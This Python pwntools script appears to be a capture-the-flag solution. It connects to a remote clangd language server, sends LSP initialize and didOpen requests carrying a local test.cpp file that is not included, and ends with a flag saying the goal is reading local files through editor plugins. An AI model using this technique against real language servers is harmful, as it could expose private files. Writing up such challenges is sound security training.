from pwn import *
from pprint import pp
import json

# context.log_level = 'debug'

# io = process('clangd')
io = remote("031337.xyz", 42042)
io.recvuntil(b"stdin/stdout\n")


def rpc(io, obj):
    s = json.dumps(obj)
    io.send(f"Content-Length: {len(s)}\r\n\r\n{s}".encode())
    io.recvuntil(b"Content-Length: ")
    n = int(io.recvlineS().strip())
    io.recvn(2)  # \r\n\r\n
    r = io.recvn(n).decode()
    return json.loads(r)


pp(
    rpc(
        io,
        {
            "jsonrpc": "2.0",
            "method": "initialize",
            "params": {"trace": "verbose"},
            "id": 1,
        },
    )
)
pp(
    rpc(
        io,
        {
            "jsonrpc": "2.0",
            "method": "textDocument/didOpen",
            "params": {
                "textDocument": {
                    "uri": "file:///test.cpp",
                    "languageId": "cpp",
                    "version": 1,
                    "text": open("test.cpp").read(),
                }
            },
        },
    )
)

io.interactive()

# ictf{r34d1ng_l0c4l_fil3s_via_3dit0r_plug1ns}
